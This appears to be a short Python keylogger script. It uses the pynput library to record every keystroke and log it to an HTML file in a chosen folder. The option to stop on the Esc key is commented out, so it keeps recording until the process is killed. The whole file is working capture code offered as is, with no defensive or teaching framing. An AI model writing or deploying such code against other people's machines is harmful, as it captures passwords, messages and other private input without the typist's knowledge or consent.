#library
from pynput.keyboard import Key, Listener
#vanilla
import logging
import os
#make a log file
# Set the directory where you want to save the log file
log_dir = "give the directory where this pynput-master folder is there/pynput-master/"
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

logging.basicConfig(filename=(log_dir+"key_log.html"), 
level=logging.DEBUG, format='%(message)s')
def on_press(key):
    logging.info(str(key))
    #if  key == Key.esc:
    # Stop to listen keyboard events    
    #return False

with Listener(on_press=on_press) as listener:
    listener.join() 
